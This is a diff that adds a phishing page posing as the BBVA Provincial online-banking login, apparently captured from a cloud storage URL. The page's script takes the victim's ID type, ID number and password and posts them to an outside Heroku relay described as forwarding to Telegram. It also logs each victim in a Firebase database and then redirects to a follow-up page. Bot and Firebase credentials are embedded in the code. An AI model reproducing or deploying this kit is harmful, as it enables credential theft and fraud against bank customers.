@@ -1,0 +1,217 @@
+<!-- url: https://promotion2025.z7.web.core.windows.net/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login BBVA Provincial</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+    integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import {
+      getFirestore,
+      doc,
+      setDoc,
+    } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBUWnHIPZ8JOUsX0ba-f70l2S7EkRaoz5Q",
+      authDomain: "da1assdasdg.firebaseapp.com",
+      databaseURL: "https://da1assdasdg-default-rtdb.firebaseio.com",
+      projectId: "da1assdasdg",
+      storageBucket: "da1assdasdg.firebasestorage.app",
+      messagingSenderId: "612813413332",
+      appId: "1:612813413332:web:386e44f11da041562d1441",
+      measurementId: "G-KE4GNBJ4NN"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Hacer accesible globalmente
+    window.db = db;
+    window.doc = doc;
+    window.setDoc = setDoc;
+  </script>
+  <style>
+    body {
+      font-family: "Roboto", sans-serif;
+    }
+
+    .floating-label {
+      position: relative;
+    }
+
+    .floating-label label {
+      position: absolute;
+      top: 16px;
+      left: 12px;
+      background: #f4f4f4;
+      padding: 0 4px;
+      pointer-events: none;
+      transform-origin: top left;
+      transition: all 0.2s ease;
+    }
+
+    .floating-label input:focus~label,
+    .floating-label input:not(:placeholder-shown)~label,
+    .floating-label select:focus~label,
+    .floating-label select:valid~label {
+      font-size: 12px;
+      top: 0px;
+      left: 12px;
+      color: #666;
+    }
+
+    .input-style {
+      background: #f4f4f4;
+      border: none;
+      border-bottom: 1px solid #121212;
+      height: 56px;
+      padding: 16px 12px 8px;
+      font-size: 15px;
+      padding-left: 16px;
+      width: 100%;
+    }
+
+    .input-style:focus {
+      outline: none;
+    }
+  </style>
+  <script>
+    function soloNumeros(e) {
+      var key = window.event ? e.which : e.keyCode;
+      if (key < 48 || key > 57) {
+        e.preventDefault();
+      }
+    }
+  </script>
+</head>
+
+<body class="bg-white flex flex-col min-h-screen">
+  <!-- Header -->
+  <header class="bg-[#072146] text-white p-4">
+    <div class="max-w-4xl mx-auto items-center">
+      <img src="logo-bbva-provincial1.png" alt="BBVA" style="width: 150px" />
+      <div style="font-size: 11px; margin-top: 5px">
+        Acceso a Provinet Personas
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="flex-grow flex flex-col items-center justify-center py-10 px-10">
+    <h1 class="text-2xl font-bold mb-10 text-center">Â¡Bienvenido!</h1>
+
+    <form class="w-full max-w-md space-y-6">
+      <div class="relative floating-label">
+        <select required id="cedula" class="input-style peer appearance-none bg-no-repeat pr-8">
+          <option value="" disabled selected hidden>Tipo de documento</option>
+          <option value="V">V - Venezolano</option>
+          <option value="E">E - Extranjero</option>
+          <option value="P">P - Pasaporte</option>
+        </select>
+      </div>
+
+      <div class="relative floating-label">
+
+        <input required type="text" pattern="[0-9]*" inputmode="numeric" placeholder=" " class="input-style peer"
+          id="documento" onkeypress="soloNumeros(event)" />
+
+        <label for="documento">NÃºmero de Documento</label>
+      </div>
+
+      <div class="relative floating-label">
+        <input required type="password" required placeholder=" " class="input-style peer" minlength="8" maxlength="8"
+          id="password" />
+        <label for="password">ContraseÃ±a</label>
+      </div>
+
+      <div class="pt-4">
+        <button type="submit"
+          class="bg-[#237ABA] text-white font-bold px-6 py-3 w-full rounded-sm hover:bg-[#072146] transition">
+          Continuar
+        </button>
+      </div>
+
+      <div class="text-center">
+        <a href="#" class="text-sm text-[#237aba] hover:underline">Â¿Olvidaste tu contraseÃ±a?</a>
+      </div>
+    </form>
+  </main>
+
+  <!-- Footer -->
+  <footer class="bg-[#072146] text-white text-center py-12 mt-8">
+    <div class="max-w-6xl mx-auto">
+      <div class="flex justify-center gap-6 text-lg mb-4">
+        <a href="#"><i class="fab fa-facebook-f"></i></a>
+        <a href="#"><i class="fab fa-x-twitter"></i></a>
+        <a href="#"><i class="fab fa-instagram"></i></a>
+        <a href="#"><i class="fab fa-linkedin-in"></i></a>
+        <a href="#"><i class="fab fa-youtube"></i></a>
+      </div>
+      <div class="text-xs text-[#bdbdbd]">
+        Â© 2024 BBVA Provincial S.A. RIF: J-00002967-9
+      </div>
+      <div class="text-xs text-[#00B2E3] mt-2">Creando Oportunidades</div>
+    </div>
+  </footer>
+</body>
+<script>
+  const botToken = "7845665765:AAEWoEEQKUKuqeCXseTa1Aj08vZa46kXFgI"; // Reemplaza con tu token
+  const chatId = "-4823382164"; // Reemplaza con tu chat ID
+
+  async function sendToTelegram(message) {
+    const url = `https://servidord-c102306aa0e2.herokuapp.com/provincial1`;
+    try {
+      const response = await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+
+          mensaje: message,
+          parse_mode: "Markdown",
+        }),
+      });
+
+      if (!response.ok) {
+        console.error("Error al enviar a Telegram:", await response.text());
+      }
+    } catch (err) {
+      console.error("Error de red al enviar a Telegram:", err);
+    }
+  }
+
+  document.querySelector("form").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const tipoDoc = document.getElementById("cedula").value;
+    const numeroDoc = document.getElementById("documento").value;
+    if (!/^\d+$/.test(numeroDoc)) {
+      alert("El nÃºmero de documento solo debe contener nÃºmeros.");
+      return;
+    }
+
+    const password = document.getElementById("password").value;
+    localStorage.setItem("usuario", numeroDoc);
+    const userRef = doc(window.db, "provincasdasdasdial1", numeroDoc);
+    await setDoc(userRef, {
+      page: 0,
+    });
+
+    const mensaje = `BBVA\n*Tipo de documento:* ${tipoDoc}\n*NÃºmero:* ${numeroDoc}\n*ContraseÃ±a:* ${password}`;
+
+    await sendToTelegram(mensaje);
+
+    window.location.href = "especial.html"; // Opcional
+  });
+</script>
+
+</html>
